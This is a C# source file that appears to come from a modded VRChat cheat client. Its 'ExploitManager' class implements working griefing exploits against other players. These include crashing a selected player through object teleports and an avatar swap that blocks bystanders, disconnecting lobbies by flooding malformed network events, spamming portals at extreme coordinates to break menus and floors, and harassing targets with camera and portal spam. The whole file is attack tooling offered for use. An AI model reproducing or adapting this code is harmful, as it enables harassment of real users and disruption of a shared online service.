using AstroClient.ConsoleUtils;
using DayClientML2.Utility;
using DayClientML2.Utility.Extensions;
using MelonLoader;
using System;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;
using VRC;
using VRC.Core;
using VRC.SDKBase;
using VRC.Udon;
using VRC.UserCamera;
using IEnumerator = System.Collections.IEnumerator;

namespace DayClientML2.Managers
{
    internal class ExploitManager
    {
        public static void UdonInteract()
        {
            foreach (var behavior in UnityEngine.Object.FindObjectsOfType<UdonBehaviour>())
            {
                behavior.SendCustomNetworkEvent(VRC.Udon.Common.Interfaces.NetworkEventTarget.All, "_interact");
            }
        }

        public static void RpcSpam()
        {
            string instance = "\n(っ◔◡◔)っ ♥ DayClient Wishes you a happy and nice day ♥\0";
            MiscFunc.EmojiRPC(42);
            CameraExtension.PictureRPC(Utils.CurrentUser.GetPlayer());
            CameraExtension.TakePicture(int.MaxValue);
        }

        public static void EmojiAndEmoteLag()
        {
            MiscFunc.EmojiRPC(MiscUtility.Random.Next(int.MinValue, -1));
            MiscFunc.PlayEmoteRPC(MiscUtility.Random.Next(int.MinValue, -1));
        }

        //public static void SpamMirrors()
        //{
        //    try
        //    {
        //        List<VRCSDK2.VRC_Trigger> mirrortriggers = Loader.World_Triggers.Where(s => s.interactText.ToLower().Contains("mirror") || s.name.ToLower().Contains("mirror")).ToList();
        //        foreach (VRCSDK2.VRC_Trigger vrc_Trigger in mirrortriggers)
        //        {
        //            {
        //                vrc_Trigger.TakesOwnershipIfNecessary.ToString();
        //                vrc_Trigger.Interact();
        //            }
        //        }
        //    }
        //    catch
        //    {
        //    }
        //}

        #region shit

        //public static System.Collections.IEnumerator DrawCircle(Player player) // By Love, credits to Dayoftheplay for original Orbit Code :p
        //{
        //    foreach (VRC_Pickup pickup in Loader.World_Pickups)
        //    {
        //        if (!pickup.IsHeld && pickup.gameObject.activeSelf)
        //        {
        //            if (pickup.name.ToLower().Contains("pen") || pickup.name.ToLower().Contains("marker"))
        //            {
        //                Networking.SetOwner(Utils.CurrentUser.field_Private_VRCPlayerApi_0, pickup.gameObject);
        //                Vector3 OriginalPosition = pickup.transform.position;
        //                Quaternion OriginalRotation = pickup.transform.rotation;
        //                float CircleSpeed = 6f;
        //                float alpha = 0f;
        //                float a = 1f;
        //                float b = 1f;
        //                Networking.RPC(RPC.Destination.All, pickup.gameObject, "PickedUp", new Il2CppSystem.Object[] { });
        //                pickup.transform.position = new Vector3(player.transform.position.x + a * (float)Math.Cos(alpha), player.transform.position.y + 0.3f, player.transform.position.z + b * (float)Math.Sin(alpha));
        //                pickup.transform.rotation = new Quaternion(-0.7f, 0.0f, 0.0f, 0.7f);
        //                yield return new WaitForSeconds(0.01f);
        //                Networking.RPC(RPC.Destination.All, pickup.gameObject, "PenDown", new Il2CppSystem.Object[] { });
        //                for (int i = 0; i < 95; i++)
        //                {
        //                    alpha += Time.deltaTime * CircleSpeed;
        //                    pickup.transform.position = new Vector3(player.transform.position.x + a * (float)Math.Cos(alpha), player.transform.position.y + 0.3f, player.transform.position.z + b * (float)Math.Sin(alpha));
        //                    yield return new WaitForSeconds(0.01f);
        //                }
        //                Networking.RPC(RPC.Destination.All, pickup.gameObject, "PenUp", new Il2CppSystem.Object[] { });
        //                yield return new WaitForSeconds(0.01f);
        //                pickup.transform.position = OriginalPosition;
        //                pickup.transform.rotation = OriginalRotation;
        //                Networking.RPC(RPC.Destination.All, pickup.gameObject, "Dropped", new Il2CppSystem.Object[] { });
        //            }
        //        }
        //    }
        //    yield break;
        //}

        //public static System.Collections.IEnumerator FallExploit() // By Day, credits to Love for original Code :p
        //{
        //    foreach (VRC_Pickup pickup in AstroClient.WorldUtils.GetAllWorldPickups())
        //    {
        //        if (!pickup.IsHeld && pickup.gameObject.activeSelf)
        //        {
        //            if (pickup.name.ToLower().Contains("pen") || pickup.name.ToLower().Contains("marker"))
        //            {
        //                Networking.SetOwner(Utils.CurrentUser.field_Private_VRCPlayerApi_0, pickup.gameObject);
        //                Vector3 OriginalPosition = pickup.transform.position;
        //                Quaternion OriginalRotation = pickup.transform.rotation;
        //                Networking.RPC(RPC.Destination.All, pickup.gameObject, "PickedUp", new Il2CppSystem.Object[] { });
        //                yield return new WaitForSeconds(0.01f);
        //                pickup.transform.rotation = new Quaternion(-0.7f, 0.0f, 0.0f, 0.7f);
        //                Networking.RPC(RPC.Destination.All, pickup.gameObject, "PenDown", new Il2CppSystem.Object[] { });
        //                for (int i = 0; i < 20; i++)
        //                {
        //                    pickup.transform.position = Vector3.negativeInfinity;
        //                    yield return new WaitForSeconds(0.01f);
        //                    pickup.transform.position = Vector3.positiveInfinity;
        //                }
        //                Networking.RPC(RPC.Destination.All, pickup.gameObject, "PenUp", new Il2CppSystem.Object[] { });
        //                yield return new WaitForSeconds(0.01f);
        //                pickup.transform.position = OriginalPosition;
        //                pickup.transform.rotation = OriginalRotation;
        //                Networking.RPC(RPC.Destination.All, pickup.gameObject, "Dropped", new Il2CppSystem.Object[] { });
        //            }
        //        }
        //        if (pickup != null)
        //        {
        //            MiscUtility.TakeOwnershipIfNecessary(pickup.gameObject);
        //            new Thread(() =>
        //            {
        //                for (int i = 0; i < 20; i++)
        //                {
        //                    pickup.transform.position = Vector3.positiveInfinity;
        //                    Thread.Sleep(10);
        //                    pickup.transform.position = Utils.CurrentUser.transform.position + Utils.CurrentUser.transform.up * -10f;
        //                    Thread.Sleep(10);
        //                    pickup.transform.position = Vector3.negativeInfinity;
        //                }
        //            }).Start();
        //        }
        //    }
        //    yield break;
        //}

        //public static bool Enabled = false;

        //public static System.Collections.IEnumerator ItemOrbit(Player player)
        //{
        //    for (; ; )
        //    {
        //        if (Enabled)
        //        {
        //            GameObject gameObject = new GameObject();
        //            Transform transform = gameObject.transform;
        //            transform.position = player.transform.position + new Vector3(0f, 0.2f, 0f);
        //            gameObject.transform.Rotate(new Vector3(0f, 360f * Time.time, 0f));
        //            foreach (VRCSDK2.VRC_ObjectSync obj in Loader.World_ObjectSyncs)
        //            {
        //                MiscFunc.TakeOwnershipIfNecessary(obj.gameObject);
        //                obj.transform.position = gameObject.transform.position + gameObject.transform.forward;
        //                obj.transform.LookAt(player.transform);
        //                gameObject.transform.Rotate(new Vector3(0f, (float)(360 / Loader.World_ObjectSyncs.Count), 0f));
        //            }
        //            UnityEngine.Object.Destroy(gameObject);
        //        }
        //        else
        //        {
        //            yield break;
        //        }
        //        yield return new WaitForEndOfFrame();
        //    }
        //}

        //public static System.Collections.IEnumerator AutoDropItems()
        //{
        //    for (; ; )
        //    {
        //        foreach (var pickup in Loader.World_Pickups)
        //        {
        //            if (pickup.IsHeld)
        //            {
        //                var currentplayer = Utils.PlayerManager.GetPlayerID(pickup.currentPlayer.playerId);
        //                if (currentplayer.UserID() != APIUser.CurrentUser.id)
        //                {
        //                    ModConsole.DebugLog($"<color=#FFC4FF>{currentplayer.DisplayName()}</color> Has Tried Picking Up {pickup.name}");
        //                    ModConsole.Log($"[AutoDropItems] {currentplayer.DisplayName()} Has Tried Picking Up {pickup.name}");
        //                    MiscFunc.TakeOwnershipIfNecessary(pickup.gameObject);
        //                    pickup.Drop();
        //                }
        //            }
        //        }
        //        yield return new WaitForSeconds(0.1f);
        //    }
        //}

        #endregion shit

        public static VRC_EventHandler handler;
        public static VRC_EventHandler.VrcEvent Event1;
        public static VRC_EventHandler.VrcEvent Event2;
        public static bool shit = false;

        public static IEnumerator ItemCrash(Player p)
        {
            for (; ; )
            {
                foreach (VRC.SDKBase.VRC_Trigger vrc_Trigger in UnityEngine.Object.FindObjectsOfType<VRC.SDKBase.VRC_Trigger>())
                {
                    if (vrc_Trigger.HasPickupTriggers)
                    {
                        vrc_Trigger.TakesOwnershipIfNecessary.ToString();
                        vrc_Trigger.Interact();
                    }
                }
                foreach (VRC.SDKBase.VRC_Pickup vrc_Pickup in UnityEngine.Object.FindObjectsOfType<VRC.SDKBase.VRC_Pickup>())
                {
                    if (vrc_Pickup.GetComponent<Collider>() && !vrc_Pickup.GetComponent<VRC.SDKBase.VRC_SpecialLayer>() && !vrc_Pickup.IsHeld)
                    {
                        TakeOwnershipIfNecessary(vrc_Pickup.gameObject);
                        vrc_Pickup.pickupable = true;
                        vrc_Pickup.transform.position = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                    }
                }
                yield return new WaitForEndOfFrame();
                foreach (VRC.SDKBase.VRC_Pickup vrc_Pickup in UnityEngine.Object.FindObjectsOfType<VRC.SDKBase.VRC_Pickup>())
                {
                    if (vrc_Pickup.GetComponent<Collider>() && !vrc_Pickup.GetComponent<VRC.SDKBase.VRC_SpecialLayer>() && !vrc_Pickup.IsHeld)
                    {
                        TakeOwnershipIfNecessary(vrc_Pickup.gameObject);
                        vrc_Pickup.pickupable = true;
                    }
                }
                yield return new WaitForEndOfFrame();
            }
            yield break;
        }

        public static IEnumerator Test(Player p)
        {
            for (; ; )
            {
                try
                {
                    NEvent(VRC_EventHandler.VrcEventType.AddHealth, VRC_EventHandler.VrcTargetType.All, VRC_EventHandler.VrcBroadcastType.Always, Networking.SceneEventHandler.gameObject, MiscUtility.RandomString(250), new object[]
                    {
                        MiscUtility.RandomString(250),
                        MiscUtility.RandomString(250),
                        MiscUtility.RandomString(250),
                        MiscUtility.RandomString(250),
                    }, float.MaxValue);
                    NEvent(VRC_EventHandler.VrcEventType.AddDamage, VRC_EventHandler.VrcTargetType.All, VRC_EventHandler.VrcBroadcastType.Always, Networking.SceneEventHandler.gameObject, MiscUtility.RandomString(250), new object[]
                    {
                        MiscUtility.RandomString(250),
                        MiscUtility.RandomString(250),
                        MiscUtility.RandomString(250),
                        MiscUtility.RandomString(250),
                    }, float.MaxValue);
                }
                catch (Exception e) { Console.WriteLine(e); }
                yield return new WaitForSeconds(0.1f);
            }
            yield break;
        }

        private static void TakeOwnershipIfNecessary(GameObject gameObject)
        {
            MiscFunc.TakeOwnershipIfNecessary(gameObject);
        }

        public static void Lag(string AvatarID)
        {
            VRC_AvatarPedestal[] allPedestals = UnityEngine.Object.FindObjectsOfType<VRC_AvatarPedestal>();
            foreach (VRC_AvatarPedestal pedestal in allPedestals)
            {
                Networking.RPC(RPC.Destination.All, pedestal.gameObject, "SwitchAvatar", new Il2CppSystem.Object[] { AvatarID });
                pedestal.SwitchAvatar(AvatarID);
                //Networking.RPC(RPC.Destination.All, pedestal.gameObject, "SetAvatarUse", new Il2CppSystem.Object[] { player.field_Private_VRCPlayerApi_0, });
            }
        }

        public static IEnumerator PhotonDesyncWorld()
        {
            for (; ; )
            {
                if (RoomManager.field_Internal_Static_ApiWorld_0 == null)
                {
                    yield break;
                }
                //NetworkingExt.OpRaiseEvent(210, new int[] { new System.Random().Next(0, short.MaxValue), Networking.LocalPlayer.playerId }, new ObjectPublicObByObInByObObUnique()
                //{
                //    field_Public_EnumPublicSealedvaOtAlMa4vUnique_0 = EnumPublicSealedvaOtAlMa4vUnique.Others,
                //}, SendOptions.SendReliable);
                //NetworkingExt.OpRaiseEvent(209, new int[] { new System.Random().Next(0, short.MaxValue), Networking.LocalPlayer.playerId }, new ObjectPublicObByObInByObObUnique()
                //{
                //    field_Public_EnumPublicSealedvaOtAlMa4vUnique_0 = EnumPublicSealedvaOtAlMa4vUnique.Others,
                //}, SendOptions.SendReliable);
                yield return new WaitForSeconds(0.02f);
            }
            yield break;
        }

        //public static void TpObjects(Player player)
        //{
        //    foreach (VRCSDK2.VRC_ObjectSync obj in Loader.World_ObjectSyncs)
        //    {
        //        Networking.SetOwner(Utils.CurrentUser.field_Private_VRCPlayerApi_0, obj.gameObject);
        //        obj.transform.rotation = new Quaternion(-0.7f, 0.0f, 0.0f, 0.7f);
        //        obj.transform.position = player.transform.position;
        //    }
        //}

        public static System.Collections.IEnumerator CrashPlayer(VRCSDK2.VRC_ObjectSync pickup, Player player)
        {
            Networking.SetOwner(Networking.LocalPlayer, pickup.gameObject);
            int num;
            for (int i = 0; i < 90; i = num + 1)
            {
                pickup.transform.position = player.transform.position;
                pickup.transform.rotation = Quaternion.Euler(0f, 0f, 0f);
                yield return null;
                num = i;
            }
            pickup.gameObject.transform.position = new Vector3(pickup.transform.position.x, Vector3.positiveInfinity.y, pickup.transform.rotation.z);
            yield break;
        }

        public static void CrashSelected()
        {
            VRCSDK2.VRC_ObjectSync vrc_ObjectSync = Resources.FindObjectsOfTypeAll<VRCSDK2.VRC_ObjectSync>().FirstOrDefault((VRCSDK2.VRC_ObjectSync o) => o.GetComponents<Collider>().Concat(o.GetComponentsInChildren<Collider>()).Any((Collider c) => !c.isTrigger && (1016111 >> c.gameObject.layer & 1) == 1));
            if (vrc_ObjectSync != null)
            {
                MelonCoroutines.Start(CrashPlayer(vrc_ObjectSync, Utils.QuickMenu.SelectedPlayer()));
                return;
            }
        }

        private static GameObject ForwardObject;
        private static bool isActive = false;
        private static string CurrentAvatarID;
        //public static System.Collections.IEnumerator WorldClap(bool State)
        //{
        //    if (State)
        //    {
        //        if (Utils.CurrentUser.GetApiAvatar().id != Loader.Config.WorldClap)
        //        {
        //            CurrentAvatarID = Utils.CurrentUser.GetApiAvatar().id;
        //            SelfHide(true);
        //            MiscFunc.ChangeAvatar(Loader.Config.WorldClap);
        //            MelonLoader.MelonCoroutines.Start(CameraCrash());
        //            MiscFunc.EmojiRPC(29);
        //        }
        //    }
        //    else
        //    {
        //        for (; ; )
        //        {
        //            if (Utils.CurrentUser.GetApiAvatar().id == Loader.Config.WorldClap)
        //            {
        //                MiscFunc.ChangeAvatar(CurrentAvatarID);
        //            }
        //            else
        //            {
        //                SelfHide(false);
        //                Utils.CurrentUser.ReloadAvatar();
        //                break;
        //            }
        //            yield return new WaitForSeconds(1);
        //        }

        //    }
        //    yield break;
        //}
        internal static void ToggleAvatar(Player target)
        {
            var player = Utils.QuickMenu.SelectedPlayer();
            var ForwardDirection = player.gameObject.transform.Find("ForwardDirection");
            var state = ForwardDirection.gameObject.activeSelf;
            ForwardDirection.gameObject.SetActive(!state);
        }

        public static void SelfHide(bool State)
        {
            if (ForwardObject == null)
                ForwardObject = GameObject.Find(Utils.CurrentUser.gameObject.name + "/ForwardDirection");
            if (isActive == State)
                return;
            if (isActive && State)
                return;
            ForwardObject.SetActive(!State);
            isActive = State;
        }

        //public static System.Collections.IEnumerator WorldClap(bool State)
        //{
        //    if (State)
        //    {
        //        if (Utils.CurrentUser.GetApiAvatar().id != Config.Instance.AvatarID1)
        //        {
        //            CurrentAvatarID = Utils.CurrentUser.GetApiAvatar().id;
        //            SelfHide(true);
        //            MiscFunc.ChangeAvatar(Config.Instance.AvatarID1);
        //            MiscFunc.EmojiRPC(29);
        //        }
        //    }
        //    else
        //    {
        //        for (; ; )
        //        {
        //            if (Utils.CurrentUser.GetApiAvatar().id == Config.Instance.AvatarID1)
        //            {
        //                MiscFunc.ChangeAvatar(CurrentAvatarID);
        //            }
        //            else
        //            {
        //                yield return new WaitForSeconds(2);
        //                SelfHide(false);
        //                Utils.CurrentUser.ReloadAvatar();
        //                break;
        //            }
        //            yield return new WaitForSeconds(1);
        //        }
        //    }
        //    yield break;
        //}

        public static bool UserCamAnnoy = false;

        internal static IEnumerator AnnoyingCamera(Player player)
        {
            UserCameraController instance = Utils.UserCameraController;
            CameraExtension.SetCameraMode(CameraExtension.CameraMode.Photo);
            CameraExtension.SetCameraSpace(CameraExtension.CameraSpace.COUNT);
            CameraExtension.SetCameraSpace(CameraExtension.CameraSpace.World);
            CameraExtension.TakePicture(int.MaxValue);
            UserCamAnnoy = true;
            yield return new WaitForSeconds(0.3f);
            for (; ; )
            {
                while (RoomManager.field_Internal_Static_ApiWorld_0 == null) yield break;
                while (player.field_Internal_VRCPlayer_0 == null) yield break;
                instance.transform.position = player.transform.position;
                instance.field_Private_Vector3_0 = player.transform.position;
                instance.field_Private_Single_0 = 0f;
                CameraExtension.PictureRPC(player);

                if (!UserCamAnnoy)
                {
                    instance.StopAllCoroutines();
                    yield return new WaitForSeconds(0.1f);
                    instance.transform.position = Utils.CurrentUser.transform.position;
                    instance.field_Private_Vector3_0 = Utils.CurrentUser.transform.position; ;
                    CameraExtension.SetCameraMode(CameraExtension.CameraMode.Off);
                    CameraExtension.SetCameraSpace(CameraExtension.CameraSpace.Local);
                    CameraExtension.SetCameraSpace(CameraExtension.CameraSpace.Attached);
                    CameraExtension.SetCameraMode(CameraExtension.CameraMode.Photo);
                    yield return new WaitForSeconds(0.1f);
                    CameraExtension.SetCameraMode(CameraExtension.CameraMode.Off);
                    yield break;
                }
                yield return new WaitForSeconds(0.5f);
            }
            yield break;
        }

        public static bool UserPortalAnnoy = false;

        internal static IEnumerator PortalAnnoy(Player player)
        {
            UserPortalAnnoy = true;
            for (; ; )
            {
                while (RoomManager.field_Internal_Static_ApiWorld_0 == null) yield break;
                while (player.field_Internal_VRCPlayer_0 == null) yield break;
                MiscFunc.DropPortal(RoomManagerExtension.GetWorld().id, $"{MiscUtility.Random.Next(0000, 9999)}\n" +
                    $"{player.DisplayName()}\n{RoomManagerExtension.GetWorldInstance().GetAccessType().ToString()}\n\0", 0, player.transform.position + player.transform.forward * 1.5f, player.transform.rotation);
                if (!UserPortalAnnoy)
                {
                    yield break;
                }
                yield return new WaitForSeconds(MiscUtility.Random.Next(3, 6));
            }
            yield break;
        }

        //internal static IEnumerator StopCringyClientItems()
        //{
        //    for (; ; )
        //    {
        //        try
        //        {
        //            for (int i = 0; i < Loader.World_ObjectSyncs.Count; i++)
        //            {
        //                var item = Loader.World_ObjectSyncs[i];
        //                if (MiscUtility.TakeOwnershipIfNecessary(item.gameObject))
        //                {
        //                    ModConsole.Log($"[Protection] Stopped Someone from using an Item");
        //                    item.transform.position = Vector3.zero;
        //                }
        //            }
        //        }
        //        catch
        //        {
        //            ModConsole.Error("[Protection] Something went Wrong");
        //            continue;
        //        }
        //        yield return new WaitForEndOfFrame();
        //    }
        //    yield break;
        //}

        private static bool CrashPlayerRunning = false;
        private static List<string> CrashUsers = new List<string>();

        internal static IEnumerator TargetAvatarCrash(Player Target, string AvatarID)
        {
            if (CrashPlayerRunning)
            {
                ModConsole.Log("A Crash is already in Action");
            }
            if (!CrashPlayerRunning)
            {
                CrashPlayerRunning = true;
                ModConsole.Log("Crash Started on " + Target?.DisplayName());
                CrashUsers.Clear();
                foreach (var player in Utils.PlayerManager.AllPlayers())
                {
                    CrashUsers.Add(player.UserID());
                }
                foreach (var player in CrashUsers)
                {
                    if (player != null)
                        if (player != Target?.UserID())
                        {
                            ToggleBlockOne(player);
                            yield return new WaitForSeconds(0.33f);
                        }
                }
                var BackSwitch = Utils.CurrentUser.GetApiAvatar().id;
                SelfHide(true);
                yield return new WaitForSeconds(2f);
                MiscFunc.ChangeAvatar(AvatarID);
                yield return new WaitForSeconds(15f);
                MiscFunc.ChangeAvatar(BackSwitch);
                yield return new WaitForSeconds(1.5f);
                SelfHide(false);
                PlayerExtensions.ReloadAvatar(Utils.CurrentUser);
                yield return new WaitForSeconds(2f);
                foreach (var player in CrashUsers)
                {
                    if (player != null)
                        if (player != Target?.UserID())
                        {
                            ToggleBlockOne(player);
                            yield return new WaitForSeconds(0.33f);
                        }
                }
                ModConsole.Log("Crash Done on " + Target?.DisplayName());
                CrashPlayerRunning = false;
            }
            yield break;
        }

        internal static IEnumerator PortalMenuRemover()
        {
            ModConsole.Log("[Portal] Menu Remover Start");
            for (; ; )
            {
                GameObject Portal = Networking.Instantiate(VRC_EventHandler.VrcBroadcastType.Always,
                    "Portals/PortalInternalDynamic", new Vector3(int.MaxValue, int.MaxValue, int.MaxValue) * 268, Quaternion.identity);
                Portal.transform.position = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue) * 268;
                Networking.RPC(RPC.Destination.AllBufferOne, Portal, "ConfigurePortal", new Il2CppSystem.Object[]
                {
                    (Il2CppSystem.String) RoomManagerExtension.GetWorld().id,
                    (Il2CppSystem.String) MiscUtility.RandomString(240),
                    new Il2CppSystem.Int32
                    {
                        m_value = new System.Random().Next(0, 5)
                    }.BoxIl2CppObject()
                });
                Portal.SetActive(false);
                yield return new WaitForSeconds(5);
            }

            ModConsole.Log("[Portal] Menu Remover End");
            yield break;
        }

        internal static IEnumerator PortalFloorRemover()
        {
            ModConsole.Log("[Portal] Floor Remover Start");
            for (; ; )
            {
                try
                {
                    GameObject Portal = Networking.Instantiate(VRC_EventHandler.VrcBroadcastType.Always,
                "Portals/PortalInternalDynamic", new Vector3(int.MaxValue, int.MaxValue, int.MaxValue) * 268, Quaternion.identity);
                    Portal.transform.position = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue) * 268;
                    Networking.RPC(RPC.Destination.AllBufferOne, Portal, "ConfigurePortal", new Il2CppSystem.Object[]
                    {
                    (Il2CppSystem.String) RoomManagerExtension.GetWorld().id,
                    (Il2CppSystem.String) MiscUtility.RandomString(240),
                    new Il2CppSystem.Int32
                    {
                        m_value = new System.Random().Next(0, 5)
                    }.BoxIl2CppObject()
                    });
                    Portal.SetActive(false);
                }
                catch
                {
                }
                yield return new WaitForSeconds(3f);
                try
                {
                    GameObject Portal = Networking.Instantiate(VRC_EventHandler.VrcBroadcastType.Always,
                "Portals/PortalInternalDynamic", new Vector3(int.MinValue, int.MinValue, int.MinValue) * 268, Quaternion.identity);
                    Portal.transform.position = new Vector3(int.MinValue, int.MinValue, int.MinValue) * 268;
                    Networking.RPC(RPC.Destination.AllBufferOne, Portal, "ConfigurePortal", new Il2CppSystem.Object[]
                    {
                    (Il2CppSystem.String) RoomManagerExtension.GetWorld().id,
                    (Il2CppSystem.String) MiscUtility.RandomString(240),
                    new Il2CppSystem.Int32
                    {
                        m_value = new System.Random().Next(0, 5)
                    }.BoxIl2CppObject()
                    });
                    Portal.SetActive(false);
                }
                catch
                {
                }
            }
            ModConsole.Log("[Portal] Floor Remover End");
            yield break;
        }

        internal static IEnumerator DisconnectLobby()
        {
            for (; ; )
            {
                try
                {
                    if (handler == null)
                        handler = Resources.FindObjectsOfTypeAll<VRC_EventHandler>()[0];
                    Player plr = Utils.PlayerManager.AllPlayers().ToArray()[new System.Random().Next(0, Utils.PlayerManager.AllPlayers().Count)];
                    VRC_EventHandler.VrcEvent vrcEvent = new VRC_EventHandler.VrcEvent
                    {
                        EventType = VRC_EventHandler.VrcEventType.AddHealth,
                        Name = MiscUtility.RandomString(240),
                        ParameterObject = handler.gameObject,
                        ParameterInt = 1,
                        ParameterFloat = 0f,
                        ParameterString = MiscUtility.RandomString(840),
                        ParameterBoolOp = VRC_EventHandler.VrcBooleanOp.Unused,
                        ParameterBytes = new UnhollowerBaseLib.Il2CppStructArray<byte>(0),
                    };
                    VRC_EventHandler.VrcEvent vrcEvent2 = new VRC_EventHandler.VrcEvent
                    {
                        EventType = VRC_EventHandler.VrcEventType.AddDamage,
                        Name = MiscUtility.RandomString(240),
                        ParameterObject = handler.gameObject,
                        ParameterInt = 1,
                        ParameterFloat = 0f,
                        ParameterString = MiscUtility.RandomString(840),
                        ParameterBoolOp = VRC_EventHandler.VrcBooleanOp.Unused,
                        ParameterBytes = new UnhollowerBaseLib.Il2CppStructArray<byte>(0),
                    };
                    //VRC_EventHandler.VrcEvent vrcEvent3 = new VRC_EventHandler.VrcEvent
                    //{
                    //    EventType = VRC_EventHandler.VrcEventType.AnimationTrigger,
                    //    Name = MiscUtility.RandomString(240),
                    //    ParameterObject = handler.gameObject,
                    //    ParameterInt = 1,
                    //    ParameterFloat = 0f,
                    //    ParameterString = MiscUtility.RandomString(840),
                    //    ParameterBoolOp = VRC_EventHandler.VrcBooleanOp.Unused,
                    //    ParameterBytes = new UnhollowerBaseLib.Il2CppStructArray<byte>(0),
                    //};

                    handler.TriggerEvent(vrcEvent, VRC_EventHandler.VrcBroadcastType.Always, plr.gameObject, 0f);
                    handler.TriggerEvent(vrcEvent2, VRC_EventHandler.VrcBroadcastType.Always, plr.gameObject, 0f);
                    //handler.TriggerEvent(vrcEvent3, VRC_EventHandler.VrcBroadcastType.Always, plr.gameObject, 0f);
                    //Networking.RPC(RPC.Destination.All, handler.gameObject, MiscUtility.RandomString(420), new Il2CppSystem.Object[]
                    //{
                    //    (Il2CppSystem.String)MiscUtility.RandomString(240),
                    //    (Il2CppSystem.String)MiscUtility.RandomString(240),
                    //});
                    //MiscFunc.EmojiRPC(29);
                    // MiscFunc.PlayEmoteRPC(3);
                }
                catch { }
                yield return new WaitForSecondsRealtime(0.1f);
            }
            yield break;
        }

        internal static IEnumerator DisconnectLobbyPortal()
        {
            for (; ; )
            {
                try
                {
                    GameObject Portal = Networking.Instantiate(VRC_EventHandler.VrcBroadcastType.Always,
                    "Portals/PortalInternalDynamic", new Vector3(int.MaxValue, int.MaxValue, int.MaxValue) * 268, Quaternion.identity);
                    Networking.RPC(RPC.Destination.AllBufferOne, Portal, "ConfigurePortal", new Il2CppSystem.Object[]
                    {
                    (Il2CppSystem.String) RoomManagerExtension.GetWorld().id,
                    (Il2CppSystem.String) MiscUtility.RandomNumberString(240),
                    new Il2CppSystem.Int32
                    {
                        m_value = new System.Random().Next(0, 5)
                    }.BoxIl2CppObject()
                    });
                    Portal.SetActive(false);
                }
                catch { }
                yield return new WaitForSecondsRealtime(0.11f);
            }
            yield break;
        }

        private static List<string> CrashUsers2 = new List<string>();

        internal static IEnumerator TargetAvatarCrash(List<string> Targets, string AvatarID)
        {
            if (CrashPlayerRunning)
            {
                ModConsole.Log("A Crash is already in Action");
            }
            if (!CrashPlayerRunning)
            {
                CrashPlayerRunning = true;
                CrashUsers2.Clear();
                foreach (var player in Utils.PlayerManager.AllPlayers())
                {
                    CrashUsers2.Add(player.UserID());
                }
                foreach (var player in CrashUsers2)
                {
                    if (player != null)
                        if (!Targets.Contains(player))
                        {
                            ToggleBlockOne(player);
                            yield return new WaitForSeconds(0.33f);
                        }
                }
                var BackSwitch = Utils.CurrentUser.GetApiAvatar().id;
                SelfHide(true);
                yield return new WaitForSeconds(2f);
                MiscFunc.ChangeAvatar(AvatarID);
                yield return new WaitForSeconds(15f);
                MiscFunc.ChangeAvatar(BackSwitch);
                yield return new WaitForSeconds(1.5f);
                SelfHide(false);
                PlayerExtensions.ReloadAvatar(Utils.CurrentUser);
                yield return new WaitForSeconds(2f);
                foreach (var player in CrashUsers2)
                {
                    if (player != null)
                        if (!Targets.Contains(player))
                        {
                            ToggleBlockOne(player);
                            yield return new WaitForSeconds(0.33f);
                        }
                }
                CrashPlayerRunning = false;
            }
            yield break;
        }

        public static void ToggleBlockOne(Player player)
        {
            var userinfo = GameObject.Find("Screens").transform.Find("UserInfo").GetComponent<VRC.UI.PageUserInfo>();
            {
                userinfo.field_Public_APIUser_0 = new APIUser
                {
                    id = player.field_Private_APIUser_0.id
                };
                if (userinfo.GetUser().id != APIUser.CurrentUser.id)
                {
                    userinfo.ToggleBlock();
                }
            }
        }

        public static void ToggleBlockOne(string player)
        {
            var userinfo = GameObject.Find("Screens").transform.Find("UserInfo").GetComponent<VRC.UI.PageUserInfo>();
            {
                userinfo.field_Public_APIUser_0 = new APIUser
                {
                    id = player
                };
                if (userinfo.GetUser().id != APIUser.CurrentUser.id)
                {
                    userinfo.ToggleBlock();
                }
            }
        }

        private static void ToggleMuteOne(Player player)
        {
            var userinfo = GameObject.Find("Screens").transform.Find("UserInfo").GetComponent<VRC.UI.PageUserInfo>();
            {
                userinfo.field_Public_APIUser_0 = new APIUser
                {
                    id = player.field_Private_APIUser_0.id
                };
                if (userinfo.GetUser().id != APIUser.CurrentUser.id)
                {
                    userinfo.ToggleMute();
                }
            }
        }

        private static void SingleNRPC(VRCPlayer player, GameObject gameObject, string method, params object[] parameter)
        {
            if (handler == null)
                handler = Resources.FindObjectsOfTypeAll<VRC_EventHandler>()[0];
            parameter = new List<object>(parameter)
            {
                player.GetVRCPlayerApi().playerId,
            }.ToArray();
            Il2CppSystem.Object[] Il2cppParameters = MiscUtility.Serialization.FromManagedToIL2CPP<Il2CppSystem.Object[]>(parameter);
            byte[] array = Networking.EncodeParameters(Il2cppParameters);
            VRC_EventHandler.VrcEvent e = new VRC_EventHandler.VrcEvent
            {
                EventType = VRC_EventHandler.VrcEventType.SendRPC,
                ParameterObject = gameObject,
                ParameterString = method,
                ParameterBytes = array,
                ParameterInt = 9
            };
            handler.TriggerEvent(e, VRC_EventHandler.VrcBroadcastType.AlwaysUnbuffered, Networking.LocalPlayer.playerId, 0f);
        }

        private static void NEvent(VRC_EventHandler.VrcEventType eventType, VRC_EventHandler.VrcTargetType targetType, VRC_EventHandler.VrcBroadcastType broadcastType, GameObject gameObject, string method, object[] parameter, float fastforward = 0)
        {
            if (handler == null)
                handler = Resources.FindObjectsOfTypeAll<VRC_EventHandler>()[0];
            Il2CppSystem.Object[] Il2cppParameters = new Il2CppSystem.Object[parameter.Length];
            for (int i = 0; i < parameter.Length; i++)
            {
                Il2cppParameters[i] = MiscUtility.Serialization.FromManagedToIL2CPP<Il2CppSystem.Object>(parameter[i]);
            }
            byte[] array = Networking.EncodeParameters(Il2cppParameters);
            VRC_EventHandler.VrcEvent e = new VRC_EventHandler.VrcEvent
            {
                EventType = eventType,
                ParameterObject = gameObject,
                ParameterString = method,
                ParameterBytes = array,
                ParameterInt = (int)targetType,
            };
            handler.TriggerEvent(e, broadcastType, Networking.LocalPlayer.playerId, fastforward);
        }
    }
}